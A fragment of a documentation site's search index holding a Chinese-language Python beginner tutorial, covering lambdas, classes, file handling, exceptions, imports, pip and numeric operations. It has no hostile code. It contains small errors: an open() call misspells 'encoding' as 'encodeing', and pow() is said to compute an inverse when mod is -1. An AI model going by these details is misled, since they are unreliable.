\u53ef\u53d8\u53d8\u91cf\uff08\u4f8b\u5982\u5217\u8868\uff09\u5728\u51fd\u6570\u5185\u90e8\u53ef\u4ee5\u88ab\u6539\u53d8 \u907f\u514d\u5411\u51fd\u6570\u4f20\u9012\u53ef\u53d8\u53d8\u91cf\uff08\u5217\u8868\u53ef\u4f20\u5165 [:] \u521b\u5efa\u7684\u526f\u672c\uff09 \u533f\u540d\u51fd\u6570 \u00b6 \u53ef\u4ee5\u901a\u8fc7 lambda \u8868\u8fbe\u5f0f\u6765\u5b9a\u4e49\u533f\u540d\u51fd\u6570 lambda \u8f93\u5165: \u8f93\u51fa\u8868\u8fbe\u5f0f \u53ef\u4ee5\u6709\u591a\u4e2a\u8f93\u5165 \u53ef\u4ee5\u5c06\u4e00\u4e2a\u51fd\u6570\u8d4b\u503c\u7ed9\u4e00\u4e2a\u53d8\u91cf \u907f\u514d\u7528 lambda \u8d4b\u503c\u7684\u5f62\u5f0f\u5b9a\u4e49\u51fd\u6570 \u4f8b\u5982 __name__ \u5c5e\u6027\u4e0d\u4f1a\u662f\u51fd\u6570\u540d\uff0c\u800c\u662f \"\\<lambda>\" lambda a : a ** 2 + 2 * a + 1 ( lambda a : a ** 2 + 2 * a + 1 )( 2 ) # 9 lambda a , b : a * 2 + b f = lambda a : a ** 2 + 2 * a + 1 ## \u8fd1\u4f3c\u7b49\u4ef7\u4e8e def f ( a ): return a ** 2 + 2 * a + 1 \u7528\u6237\u8f93\u5165 \u00b6 \u8bfb\u53d6\u7528\u6237\u8f93\u5165\u4f7f\u7528\u5185\u7f6e\u7684 input \u51fd\u6570 \u51fd\u6570\u53c2\u6570\u4e3a\u8981\u663e\u793a\u7684\u63d0\u793a\u7b26\uff0c\u4f8b\u5982 input(\"> \") \u51fd\u6570\u7684\u8fd4\u56de\u503c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32 \u6bcf\u6b21\u8bfb\u5165\u4e00\u884c\uff08\u5373\u8bfb\u5230\u6362\u884c\u4e3a\u6b62\uff09 \u9ad8\u9636\u51fd\u6570\u7528\u6cd5 \u00b6 \u63a5\u6536\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u7684\u51fd\u6570\u88ab\u79f0\u4e3a\u9ad8\u9636\u51fd\u6570 \u6bd4\u8f83\u5e38\u7528\u7684\u6709 map\u3001filter list ( map ( lambda x : x * 2 , [ 1 , 2 ])) ## [2, 4] list ( filter ( lambda x : x > 1 , [ 1 , 2 , 3 ])) ## [2, 3] \u7c7b\u4e0e\u9762\u5411\u5bf9\u8c61 \u00b6 \u7c7b \u00b6 \u7c7b\u53ef\u4ee5\u770b\u6210\u5305\u542b\u4e00\u4e9b \u5c5e\u6027 \u548c \u65b9\u6cd5 \u7684\u6846\u67b6 \u6839\u636e\u7c7b\u6765\u521b\u5efa\u5bf9\u8c61 -> \u5b9e\u4f8b\u5316 \u7528 class \u5173\u952e\u5b57\u6765\u5b9a\u4e49\u7c7b \u7c7b\u4e2d\u7684\u51fd\u6570 -> \u65b9\u6cd5 \u7279\u6b8a\u65b9\u6cd5 __init__\uff0c\u5728\u7c7b\u5b9e\u4f8b\u5316\u7684\u65f6\u5019\u4f1a\u88ab\u81ea\u52a8\u8c03\u7528 \u5176\u5b83\u4e00\u822c\u7684\u65b9\u6cd5\u7b2c\u4e00\u4e2a\u53c2\u6570\u90fd\u8981\u4e3a\"self\"\uff0c\u8c03\u7528\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u4f20\u5165 \u76f4\u63a5\u5199\u5728\u7c7b\u4e2d\u7684\u662f\u5c5e\u6027\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4e3a self.\\<name> \u8d4b\u503c\u7684\u5f62\u5f0f\u521b\u5efa\u5c5e\u6027 \u7528\u7c7b\u4f3c\u51fd\u6570\u8c03\u7528\u7684\u5f62\u5f0f\u5b9e\u4f8b\u5316\u7c7b\uff0c\u53c2\u6570\u4e3a__init__\u65b9\u6cd5\u7684\u53c2\u6570 \u76f4\u63a5\u901a\u8fc7 .\\<method> .\\<attribute> \u7684\u5f62\u5f0f\u8c03\u7528\u65b9\u6cd5/\u83b7\u53d6\u5c5e\u6027 class ClassName (): a = 1 def __init__ ( self , arg1 , arg2 ): self . arg1 = arg1 self . arg2 = arg2 def method ( self ): print ( self . arg1 , self . arg2 , self . a ) obj = ClassName ( 2 , 3 ) obj . method () # 2 3 1 print ( obj . a , obj . arg1 ) # 1 2 \u7c7b\u7684\u7ee7\u627f \u00b6 \u5728 class \u5b9a\u4e49\u7684\u62ec\u53f7\u4e2d\u52a0\u4e0a\u53e6\u4e00\u4e2a\u7c7b\u540d\u5219\u8868\u793a\u7ee7\u627f\u81ea\u90a3\u4e2a\u7c7b\u5b9a\u4e49\u4e00\u4e2a\u5b50\u7c7b \u5b50\u7c7b\u4f1a\u7ee7\u627f\u7236\u7c7b\u7684\u6240\u6709\u5c5e\u6027\u548c\u65b9\u6cd5 \u5b50\u7c7b\u7f16\u5199\u548c\u7236\u7c7b\u540d\u5b57\u4e00\u6837\u7684\u65b9\u6cd5\u4f1a \u91cd\u8f7d \u5728\u91cd\u8f7d\u7684\u65b9\u6cd5\u4e2d\u8c03\u7528\u7236\u7c7b\u7684\u539f\u65b9\u6cd5\u4f7f\u7528 super() \u4e5f\u53ef\u4ee5\u4e3a\u5b50\u7c7b\u5b9a\u4e49\u72ec\u6709\u7684\u65b9\u6cd5 class ClassA (): def __init__ ( self , a ): self . a = a def print ( self ): print ( self . a ) class ClassB ( ClassA ): def __init__ ( self , a ): super () . __init__ ( a ) self . a *= 2 obj = ClassB ( 1 ) obj . print () # 2 \u79c1\u6709\uff1f \u00b6 python \u4e2d\u7c7b\u5e76\u6ca1\u6709\u4e25\u683c\u79c1\u6709\u7684\u5c5e\u6027 \u53cc\u4e0b\u5212\u7ebf\u5f00\u5934\u7684\u5c5e\u6027\u4f1a\u88ab\u9690\u85cf\uff0c\u4e0d\u80fd\u76f4\u63a5\u8bfb\u53d6 \u4f46\u8fd9\u79cd\u5c5e\u6027\u53ef\u4ee5\u901a\u8fc7 _\u7c7b\u540d__\u5c5e\u6027 \u4f46\u65b9\u5f0f\u8bfb\u53d6\u5230 \u4f7f\u7528\u53cc\u4e0b\u5212\u7ebf\u5f00\u5934\u7684\u5c5e\u6027\u53ef\u4ee5\u8f7b\u5fae\u4fdd\u62a4\u5c5e\u6027\uff0c\u4f46\u5e76\u4e0d\u4ee3\u8868\u5176\u662f\u79c1\u6709\u7684 class A (): a = 1 _a = 2 __a = 3 obj = A () print ( obj . a ) # 1 print ( obj . _a ) # 2 print ( obj . __a ) # AttributeError print ( obj . _A__a ) # 3 \u4e00\u5207\u7686\u5bf9\u8c61\uff1f \u00b6 python \u4e2d\u5373\u4f7f\u6700\u7b80\u5355\u7684\u6574\u6570\u4e5f\u662f\u4e00\u4e2a\u7c7b\u7684\u5b9e\u4f8b \u901a\u8fc7 dir(...) \u67e5\u770b\u4e00\u4e2a\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027/\u65b9\u6cd5 \u6709\u5f88\u591a\u53cc\u4e0b\u5212\u7ebf\u5f00\u5934\u3001\u53cc\u4e0b\u5212\u7ebf\u7ed3\u5c3e\u7684\u65b9\u6cd5\uff0c\u6210\u4e3a\u9b54\u672f\u65b9\u6cd5\uff08dunder method\uff09 \u9b54\u672f\u65b9\u6cd5 \u00b6 \u5f88\u591a\u51fd\u6570\u3001\u8868\u8fbe\u5f0f\u5176\u5b9e\u662f\u901a\u8fc7\u8c03\u7528\u7c7b\u7684\u9b54\u672f\u65b9\u6cd5\u6765\u5b9e\u73b0\u7684 len(obj) \u8c03\u7528 obj.__len__() obj[...] \u8c03\u7528 obj.__getitem__(...) a in obj \u8c03\u7528 obj.__contains__(a) bool(obj) \u8c03\u7528 obj.__bool__() \u51fd\u6570\u7684\u8c03\u7528\u672c\u8d28\u4e0a\u662f\u8c03\u7528 func.__call__() a + b \u8c03\u7528 a.__add__(b) \u2026\u2026 \u4e00\u4e2a\u4f8b\u5b50\uff1a lst[a:b:c] \u5207\u7247\u64cd\u4f5c \u5176\u4e2d\u5207\u7247\u4e5f\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5b83\u662f\u4e00\u4e2a slice \u7c7b\u7684\u5b9e\u4f8b \u6240\u4ee5\u5b83\u7b49\u4ef7\u4e8e lst[slice(a, b, c)] \u800c\u901a\u8fc7 [] \u7684\u64cd\u4f5c\u53c8\u662f\u901a\u8fc7 __getitem__ \u9b54\u672f\u65b9\u6cd5\u5b9e\u73b0\u7684 \u6240\u4ee5\u5b83\u53c8\u7b49\u4ef7\u4e8e lst.__getitem__(slice(a, b, c)) __getitem__ \u65b9\u6cd5\u4e2d\u5904\u7406\u4e86 slice\uff0c\u8bfb\u53d6 abc \u7684\u503c\uff0c\u518d\u5904\u7406\u8fd4\u56de\u4e00\u4e2a\u65b0\u5217\u8868 \u6742\u9879\u5185\u5bb9 \u00b6 \u6587\u4ef6\u64cd\u4f5c \u00b6 open \u51fd\u6570\uff0c\u4f20\u5165\u6587\u4ef6\u540d\u3001\u6253\u5f00\u6a21\u5f0f \u6253\u5f00\u6a21\u5f0f\uff08\u53ef\u4ee5\u53e0\u52a0\uff09\uff1ar \u8bfb\uff08\u9ed8\u8ba4\uff09\u3001w \u5199\u3001x \u521b\u5efa\u5e76\u5199\u3001a \u5199\u5728\u672b\u5c3e\u3001b \u5b57\u8282\u6a21\u5f0f\u3001t \u6587\u672c\u6a21\u5f0f\uff08\u9ed8\u8ba4\uff09 \u8bfb\u53d6 \u6587\u672c\u6a21\u5f0f\u5efa\u8bae\u52a0\u4e0a encoding\uff0c\u4e0d\u7136\u5bb9\u6613\u62a5\u9519 f.read() \u8bfb\u53d6\u5168\u90e8\u5185\u5bb9\uff08\u5b57\u8282\u6a21\u5f0f\u5f97\u5230\u5b57\u8282\u5e8f\u5217\uff09 f.readline() \u8bfb\u53d6\u4e00\u884c f.readlines() \u8bfb\u53d6\u6240\u6709\u884c\uff0c\u8fd4\u56de\u4e00\u4e2a\u5217\u8868 \u5199\u5165 \u6587\u672c\u6a21\u5f0f\u540c\u6837\u5efa\u8bae\u52a0\u4e0a encoding f.write(...) \u76f4\u63a5\u5199\u5165 f.writelines(...) \u4f20\u5165\u5217\u8868\uff0c\u5143\u7d20\u95f4\u6362\u884c\u5199\u5165 \u901a\u8fc7\u8fd9\u79cd\u5f62\u5f0f\u64cd\u4f5c\u6587\u4ef6\u8bb0\u5f97\u7528\u5b8c\u540e\u8981 f.close() f = open ( \"filename\" , \"r\" , encoding = \"utf-8\" ) s = f . read () # a str ## line = f.readline() # a str ## lines = f.readlines() # a list ... f . close () f = open ( \"filename\" , \"w\" , encodeing = \"utf-8\" ) f . write ( \"...\" ) f . writelines ([ \"...\" , \"...\" ]) ... f . close () with \u5757 \u00b6 with ... as ...: \u5f00\u542f\u4e00\u4e2a\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668 \u5e38\u7528\u5728\u6587\u4ef6 open \u4e0a with \u5757\u5f00\u59cb\u81ea\u52a8\u6253\u5f00 with \u5757\u7ed3\u675f\u81ea\u52a8\u7ed3\u675f with \u5757\u7ed3\u675f\u540e\u53d8\u91cf\u4ecd\u4f1a\u7559\u5b58 with open ( \"file\" , \"r\" , encoding = \"utf-8\" ) as f : s = f . read () ... print ( f . closed ) # True \u5f02\u5e38\u4e0e\u5904\u7406 \u00b6 \u4ea7\u751f\u9519\u8bef -> \u629b\u51fa\u5f02\u5e38 -> \u7a0b\u5e8f\u7ed3\u675f raise \u5173\u952e\u5b57\u629b\u51fa\u5f02\u5e38 try-except \u5757\u6355\u83b7\u5f02\u5e38 \u53ef\u4ee5\u6709\u591a\u4e2a except\u3001\u4e0d\u53ef\u4ee5\u6ca1\u6709 except \u540e\u63a5\u5f02\u5e38\u7c7b\uff08\u6ca1\u6709\u5219\u6355\u83b7\u6240\u6709\uff09 as \u5b57\u53e5\u5b58\u4e0b\u5f02\u5e38 finally \u8bed\u53e5 \u4e0d\u7ba1\u662f\u5426\u6709\u5f02\u5e38\u90fd\u4f1a\u8fd0\u884c raise ... raise RuntimeError ( \"...\" ) try : input ( \">>> \" ) except KeyboardInterrupt : print ( \"Good bye\" ) try : print ( 1 / 0 ) except ZeroDivisionError as e : print ( \"can't devide by zero\" ) raise e finally : print ( \"finished\" ) if \u5916\u7684 else \u8bed\u53e5 \u00b6 else \u5757\u4e0d\u4ec5\u4ec5\u8ddf\u7740 if \u624d\u80fd\u4f7f\u7528 for-else for \u5faa\u73af\u7ed3\u675f\u624d\u4f1a\u8fd0\u884c for \u5faa\u73af\u88ab break \u4e86\u4e0d\u4f1a\u8fd0\u884c while-else condition \u4e0d\u6210\u7acb\u9000\u51fa\u624d\u4f1a\u8fd0\u884c \u5faa\u73af\u88ab break \u7ec8\u6b62\u4e86\u4e0d\u4f1a\u8fd0\u884c try-else try \u5757\u4e2d\u6ca1\u6709\u5f02\u5e38\u51fa\u73b0\u624d\u4f1a\u8fd0\u884c else \u5757\u4e2d\u5f02\u5e38\u4e0d\u4f1a\u88ab\u524d\u9762\u7684 except \u6355\u83b7 \u7a0b\u5e8f\u6d41\u8df3\u5230\u5757\u5916\u4e86\u4e0d\u4f1a\u8fd0\u884c\uff08return \u7b49\uff09 for value in lst : ... else : ... while condition : ... else : ... try : ... except ... : ... else : ... \u6a21\u5757\u4e0e\u5bfc\u5165 \u00b6 \u6a21\u5757\u53ef\u4ee5\u662f\u4e00\u4e2a\u5355\u72ec\u7684 .py \u6587\u4ef6\uff0c\u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2a\u6587\u4ef6\u5939 \u6587\u4ef6\u5939\u76f8\u5f53\u4e8e\u5bfc\u5165\u5176\u4e0b __init__.py \u6587\u4ef6 \u6a21\u5757\u4e2d\u6b63\u5e38\u7f16\u5199\u51fd\u6570\u3001\u7c7b\u3001\u8bed\u53e5 \u901a\u8fc7 import \u8bed\u53e5\u5bfc\u5165\u6a21\u5757 import code import code as cd from code import ... from code import * \u5bfc\u5165\u65f6\u76f8\u5f53\u4e8e\u8fd0\u884c\u4e86\u4e00\u904d\u5bfc\u5165\u7684\u4ee3\u7801 ## code.py print ( \"hello\" ) def f (): print ( \"call func in code.py\" ) ... import code # hello code . f () import code as cd # hello cd . f () from code import f # hello f () from code import * # hello f () \u201dmain \u51fd\u6570\u201c \u00b6 \u9632\u6b62\u5bfc\u5165\u65f6\u8fd0\u884c\u4ee3\u7801 \u53ea\u5141\u8bb8\u76f4\u63a5\u8fd0\u884c\u811a\u672c\u65f6\u8fd0\u884c \u901a\u8fc7\u5224\u65ad __name__ \u5982\u679c\u662f\u76f4\u63a5\u8fd0\u884c\uff0c\u5219\u5176\u7b49\u4e8e\u5b57\u7b26\u4e32 __main__ \u5982\u679c\u662f\u88ab\u5bfc\u5165\u7684\uff0c\u5219\u5176\u7b49\u4e8e\u6a21\u5757\u540d ## code.py ... if __name__ == \"__main__\" : print ( \"hello\" ) else : print ( __name__ ) import code # code $ python code.py # hello \u5185\u90e8\u6a21\u5757 \u00b6 python \u81ea\u5e26\u4e86\u5f88\u591a\u5b9e\u7528\u7684\u6a21\u5757\uff08\u6807\u51c6\u5e93\uff09 os\u3001sys\uff1a\u7cfb\u7edf\u64cd\u4f5c math\uff1a\u6570\u5b66\u8fd0\u7b97 re\uff1a\u6b63\u5219\u8868\u8fbe\u5f0f datetime\uff1a\u65e5\u671f\u4e0e\u65f6\u95f4 subprocess\uff1a\u5b50\u8fdb\u7a0b\u7ba1\u7406 argparse\uff1a\u547d\u4ee4\u884c\u53c2\u6570\u89e3\u6790 logging\uff1a\u65e5\u5fd7\u8bb0\u5f55 hashlib\uff1a\u54c8\u5e0c\u8ba1\u7b97 random\uff1a\u968f\u673a\u6570 csv\u3001json\uff1a\u6570\u636e\u683c\u5f0f\u89e3\u6790 collections\uff1a\u66f4\u591a\u7c7b\u578b ... \u770b\u6587\u6863\uff1a docs.python.org/zh-cn/3/library \u5916\u90e8\u6a21\u5757\u5b89\u88c5 \u00b6 pypi.org \u4e0a\u6709\u6781\u591a\u522b\u4eba\u5199\u597d\u4e86\u53ef\u4ee5\u7528\u7684\u6a21\u5757 numpy \u77e9\u9635\u7b49\u79d1\u5b66\u8ba1\u7b97\u3001scipy \u79d1\u5b66\u8ba1\u7b97\u3001matplotlib \u4f5c\u56fe\u2026\u2026 \u4f7f\u7528 pip \u5b89\u88c5\uff08pip / python -m pip\uff09 pip install pkg_name pip install pkg_name=... \u6307\u5b9a\u7248\u672c pip install -r requirements.txt \u5b89\u88c5 txt \u6587\u4ef6\u4e2d\u7684\u6240\u6709\u5305 pip install ... -i https://pypi.tuna.tsinghua.edu.cn/simple \u6362\u6e90 pip list\u3001pip show \u547d\u4ee4\u67e5\u770b\u5b89\u88c5\u7684\u6240\u6709\u5305/\u67d0\u4e2a\u5305\u7684\u4fe1\u606f pip uninstall pkg_name \u5378\u8f7d\u5305 pip \u5b89\u88c5\u672c\u5730\u6a21\u5757 \u76ee\u5f55\u4e0b\u9700\u8981\u5305\u542b setup.py / pyproject.toml pip install . \u5b89\u88c5\u672c\u5730\u6a21\u5757\uff08\u590d\u5236\u5230 site-packages \u4e2d\uff09 pip install -e . \u53ef\u4fee\u6539\u5f62\u5f0f\u5b89\u88c5\u672c\u5730\u6a21\u5757\uff08\u5728\u5f53\u524d\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u4ee3\u7801\uff09 \u6587\u6863\u5b57\u7b26\u4e32 \u00b6 \u6a21\u5757\u5f00\u5934\u7684\u4e09\u5f15\u53f7\u5b57\u7b26\u4e32 \u7c7b\u3001\u51fd\u6570\u5b9a\u4e49\u4e0b\u9762\u7684\u4e09\u5f15\u53f7\u5b57\u7b26\u4e32 help(...) \u7684\u65f6\u5019\u53ef\u4ee5\u663e\u793a obj.__doc__ \u8868\u793a\u8fd9\u4e32\u5b57\u7b26\u4e32 \u7f16\u8f91\u5668\u7528\u6765\u63d0\u793a \u4e00\u4e9b\u6587\u6863\u751f\u6210\u5de5\u5177\uff08sphinx \u7b49\uff09\u4ece\u4e2d\u83b7\u53d6\u6587\u6863 \"\"\" docstring for module \"\"\" def func ( ... ): \"\"\"docstring for function\"\"\" ... class A (): \"\"\"docstring for class\"\"\" def __init__ ( self , ... ): \"\"\"docstring for method\"\"\" ... \u4ee3\u7801\u89c4\u8303 \u00b6 PEP\uff1aPython Enhancement Proposals\uff1a peps.python.org PEP 8 \u89c4\u8303\uff0c\u7ed9\u51fa\u4e86\u63a8\u8350\u4f7f\u7528\u7684 python \u4ee3\u7801\u98ce\u683c\u89c4\u8303 peps.python.org/pep-0008 pep8.org \u66f4\u7ec6\u81f4\u7684\u4ee3\u7801\u98ce\u683c black github.com/psf/black flake8 flake8.pycqa.org ... \u66f4\u591a\uff1f \u00b6 \u57fa\u7840 \u300aPython \u7f16\u7a0b\uff1a\u4ece\u5165\u95e8\u5230\u5b9e\u8df5\u300b ISBN 978-7-115-54608-1 Python 3 \u83dc\u9e1f\u6559\u7a0b runoob.com/python3/python3-tutorial.html Python \u5b98\u65b9\u6587\u6863 tutorial docs.python.org/3/tutorial \u4e2d\u56fd\u5927\u5b66 mooc - \u6d59\u6c5f\u5927\u5b66 Python \u7a0b\u5e8f\u8bbe\u8ba1 \u8fdb\u9636 \u300a\u6d41\u7545\u7684 Python\u300b ISBN 978-7-115-45415-7 Python \u5b98\u65b9\u6587\u6863 docs.python.org/3 \u5b66\u4e00\u4e9b\u5b9e\u7528\u7684\u7b2c\u4e09\u65b9\u5e93\uff0c\u770b\u6587\u6863 PEP peps.python.org \uff08\u6ce8\u610f\u5206\u6e05\u6709\u6ca1\u6709\u5b9e\u65bd\uff09 GitHub \u627e\u9879\u76ee\u8bfb","title":"\u57fa\u7840\u8bed\u6cd5"},{"location":"cs/pl/python/basic/#python","text":"Abstract \u61d2\u5f97\u518d\u6574\u7406\u4e86\uff0c\u57fa\u672c\u4e0a\u662f\u4e4b\u524d\u4e00\u6b21 Python \u57fa\u7840\u6559\u5b66\u76f4\u64ad\u7684 slides \u6587\u5b57\u5185\u5bb9\uff0c\u5173\u4e8e\u57fa\u7840\u6559\u5b66\uff1a GitHub \u4ed3\u5e93\uff1a TonyCrane/PythonLecture slides\uff1a https://slides.tonycrane.cc/PythonLecture/ \u90e8\u5206\u76f4\u64ad\u56de\u653e\uff1a https://www.bilibili.com/video/BV13Z4y1h7x5/?vd_source=c0de364997e494206a0fb88c9ee8bfb1 \u8fd9\u91cc\u662f\u7eaf\u7684 slides \u6539\u5199\uff0c\u6548\u679c\u6ca1\u6709\u76f4\u63a5\u770b slides \u597d\uff0c\u800c\u4e14\u53ef\u80fd\u6709\u9519\u8bef\uff0c\u53d1\u73b0\u8bf7\u53ca\u65f6\u8bc4\u8bba\u544a\u8bc9\u6211","title":"Python \u8bed\u6cd5\u57fa\u7840"},{"location":"cs/pl/python/basic/#python_1","text":"\u89e3\u91ca\u6027\u7684\u811a\u672c\u8bed\u8a00\uff1a\u901a\u8fc7\u89e3\u91ca\u5668\u6765\u76f4\u63a5\u8fd0\u884c\uff0c\u4e0d\u9700\u8981\u7f16\u8bd1\u94fe\u63a5\u6210\u4e8c\u8fdb\u5236\u6587\u4ef6 \u52a8\u6001\u7c7b\u578b\u8bed\u8a00\uff1a\u7c7b\u578b\u5728\u8fd0\u884c\u65f6\u786e\u5b9a\uff0c\u4e0d\u9700\u8981\u901a\u8fc7\u4ee3\u7801\u660e\u6587\u89c4\u5b9a \u9762\u5411\u5bf9\u8c61\u8bed\u8a00\uff1apython \u4e2d\u4e00\u5207\u7686\u5bf9\u8c61 ...","title":"\u4ec0\u4e48\u662f python"},{"location":"cs/pl/python/basic/#python_2","text":"\u88c5\u7684\u662f\u4ec0\u4e48\uff1f \u662f\u4e00\u4e2a python \u89e3\u91ca\u5668 \uff0c\u4ee5\u53ca\u8fd0\u884c\u9700\u8981\u7684 \u73af\u5883 \u600e\u4e48\u88c5\uff1f \u5b98\u65b9\u7f51\u7ad9 https://www.python.org/downloads/ conda\uff08\u4e00\u4e2a\u597d\u7528\u7684 python \u73af\u5883\u7ba1\u7406\u5de5\u5177\uff09 anaconda \uff08\u5927\u3001\u6709\u9884\u88c5\u73af\u5883\uff09 https://www.anaconda.com/ miniconda \uff08\u5c0f\uff09 https://docs.conda.io/en/latest/miniconda \u6781\u4e0d\u5efa\u8bae\u901a\u8fc7\u5fae\u8f6f\u5e94\u7528\u5546\u5e97\u5b89\u88c5 python \u88c5\u4ec0\u4e48\u7248\u672c\uff1f \u4e24\u4e2a\u5927\u7248\u672c\uff0c2.* \u548c 3.*\uff0c\u5dee\u522b\u8f83\u5927\uff0c\u5efa\u8bae 3.* \u4e00\u4e9b\u5c0f\u7248\u672c\uff0c3.6 \u53ca\u4e4b\u524d\u4e0d\u63a8\u8350\uff0c3.7 3.8 \u7a33\u5b9a\uff0c3.9 3.10 \u5b8c\u5584\u4e2d\uff0c3.11 \u9884\u89c8\u4e2d \u7ec6\u5206\u7248\u672c\uff0c\u9009\u62e9\u6700\u65b0\uff0c3.7.13\u30013.8.13\u30013.9.12\u30013.10.4 conda \u4e0d\u5fc5\u62c5\u5fc3\u7248\u672c\uff0c\u9ed8\u8ba4 3.9\uff0c\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u865a\u62df\u73af\u5883\u6765\u4f7f\u7528\u4e0d\u540c\u7248\u672c","title":"\u600e\u4e48\u88c5 python"},{"location":"cs/pl/python/basic/#python_3","text":"\u600e\u4e48\u7528 python\uff1f \u8bb0\u4f4f\u4f60\u4e0b\u8f7d\u7684\u662f\u4e00\u4e2a\u89e3\u91ca\u5668\uff0c\u5efa\u8bae\u901a\u8fc7\u547d\u4ee4\u884c\u8fd0\u884c python code.py \u4ec0\u4e48\u662f\u547d\u4ee4\u884c\uff1f \u901a\u8fc7\u8f93\u5165\u547d\u4ee4\u6765\u901a\u77e5\u7535\u8111\u6267\u884c\u67d0\u6307\u4ee4\u3001\u6216\u8005\u8fd0\u884c\u67d0\u7a0b\u5e8f Windows\uff1acmd\u3001Powershell -> \u5355\u72ec\u8fd0\u884c / Windows Terminal /... macOS\uff1azsh\u3001... -> \u7ec8\u7aef / iTerm /... Linux\uff1abash\u3001zsh\u3001... -> \u7ec8\u7aef / ... \u7528\u4ec0\u4e48\u5199\u4ee3\u7801\uff1f \u8bb0\u4f4f\u4f60\u7f16\u5199\u7684\u53ea\u662f\u4e00\u4e2a .py \u4f5c\u4e3a\u6269\u5c55\u540d\u7684\u6587\u672c\u6587\u4ef6 \u53ea\u8981\u6587\u672c\u7f16\u8f91\u5668\u90fd\u53ef\u4ee5\u5199 \u8bb0\u4e8b\u672c\u3001\u81ea\u5e26 IDLE\u3001word Notepad++\u3001Sublime Text VSCode\uff08Visual Studio Code\uff0c\u4e0d\u662f VS\uff09 code.visualstudio.com Pycharm\uff08Community Edition \u5c31\u591f\u7528\uff09 jetbrains.com/pycharm","title":"\u600e\u4e48\u7f16\u5199\u3001\u8fd0\u884c python"},{"location":"cs/pl/python/basic/#_1","text":"\u7ed9\u4e00\u4e2a\u5185\u5bb9\u7ed1\u5b9a\u4e00\u4e2a\u6807\u7b7e\u5373\u53d8\u91cf\u540d\uff08\u6ce8\u610f\u8bf7\u4e0d\u8981\u8ba4\u4e3a\u53d8\u91cf\u7c7b\u4f3c\u4e00\u4e2a\u201c\u76d2\u5b50\u201d\uff09 \u901a\u8fc7 = \u6765\u5b9a\u4e49\u53d8\u91cf\uff0c\u53d8\u91cf\u540d = \u5185\u5bb9 \u52a8\u6001\u7c7b\u578b\uff0c\u4e0d\u9700\u8981\u89c4\u5b9a\u7c7b\u578b\uff08\u53ef\u4ee5\u901a\u8fc7 \u53d8\u91cf\u540d: \u7c7b\u578b = \u5185\u5bb9 \u6765\u8fdb\u884c\u7c7b\u578b\u6807\u6ce8\uff09 \u53d8\u91cf\u540d \u53ea\u80fd\u5305\u542b\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u4e0b\u5212\u7ebf\u3001 \u4e2d\u6587 \uff0c\u4e0d\u80fd\u6709\u7a7a\u683c\u548c\u5176\u5b83\u7b26\u53f7 \u53ea\u80fd\u4ee5\u5b57\u6bcd\u3001\u4e0b\u5212\u7ebf\u5f00\u5934\uff0c\u4e0d\u80fd\u4ee5\u6570\u5b57\u5f00\u5934\uff0c\u800c\u4e14\u5927\u5c0f\u5199\u654f\u611f \u4e0d\u80fd\u7528\u5173\u952e\u5b57\uff08\u4f8b\u5982 if def \u7b49\uff09\u4f5c\u4e3a\u53d8\u91cf\u540d\uff0c\u4e0d\u63a8\u8350\u4f7f\u7528\u5185\u7f6e\u51fd\u6570\u540d\u4f5c\u4e3a\u53d8\u91cf\u540d \u6e05\u6670\u660e\u786e\u3001\u98ce\u683c\u7edf\u4e00 \u5168\u5927\u5199\u4e00\u822c\u8868\u793a\u5e38\u91cf\u3001\u4e0d\u5efa\u8bae\u4f7f\u7528\u53cc\u4e0b\u5212\u7ebf\u5f00\u5934\u6216\u8005\u5f00\u5934\u7ed3\u5c3e\u3001\u4e0d\u5efa\u8bae\u4f7f\u7528 _ \u4f5c\u4e3a\u53d8\u91cf\u540d","title":"\u53d8\u91cf"},{"location":"cs/pl/python/basic/#_2","text":"","title":"\u6570\u636e\u7c7b\u578b"},{"location":"cs/pl/python/basic/#_3","text":"1 \u662f\u6574\u6570\uff0c1. \u662f\u6d6e\u70b9\u6570 \u6574\u6570\u4e0e\u6d6e\u70b9\u6570\u8f6c\u6362 int(...)\uff1a\u5411 0 \u820d\u5165 round(...)\uff1a\u5411\u5076\u820d\u5165\uff08\u56db\u820d\u516d\u5165\u4e94\u51d1\u5076\uff0c\u53ef\u4ee5\u5f53\u6210\u56db\u820d\u4e94\u5165\uff09 math.floor(...)\u3001math.ceil(...)\uff1a\u4e0b\u53d6\u6574\u3001\u4e0a\u53d6\u6574\uff08\u9700\u8981 import math\uff09 \u8fd0\u7b97 + - * \u52a0\u51cf\u4e58\uff0c\u5de6\u53f3\u90fd\u662f\u6574\u6570\u7ed3\u679c\u4e5f\u662f\u6574\u6570\uff0c\u6709\u6d6e\u70b9\u6570\u7ed3\u679c\u5c31\u662f\u6d6e\u70b9\u6570 / \u9664\u6cd5\uff0c\u7ed3\u679c\u662f\u6d6e\u70b9\u6570\uff08\u5373\u4f7f\u53ef\u4ee5\u6574\u9664\uff09 // \u6574\u9664\uff0c\u7ed3\u679c\u662f\u6574\u6570\uff0c\u5411\u4e0b\u53d6\u6574 % \u53d6\u6a21\uff0ca % b == a - (a//b)*b\uff08\u548c c \u7684\u884c\u4e3a\u4e0d\u4e00\u81f4\uff09 ** \u4e58\u65b9\uff0c\u53ef\u4ee5\u662f\u6d6e\u70b9\u6570\uff0c\u6bd4\u5982 a ** 0.5 \u8868\u793a\u5f00\u6839\u53f7 pow(a, b, mod)\uff1a\u4e5f\u662f\u4e58\u65b9\uff0cmod \u53ef\u4ee5\u7701\u7565\uff0c\u5982\u679c\u6709 mod \u5219\u5bf9\u7ed3\u679c\u53d6\u6a21\uff0c\u5982\u679c mod \u4e3a -1 \u5219\u8ba1\u7b97\u4e58\u6cd5\u9006\u5143 \u66f4\u591a\u8fd0\u7b97\u901a\u8fc7 math\u3001numpy\u3001scipy \u7b49\u5305\u6765\u8fdb\u884c","title":"\u6570\u5b57\u4e0e\u8fd0\u7b97"},{"location":"cs/pl/python/basic/#_4","text":"python \u4e2d\u5185\u7f6e\u4e86\u590d\u6570\u7c7b\u578b\uff0c1+2j 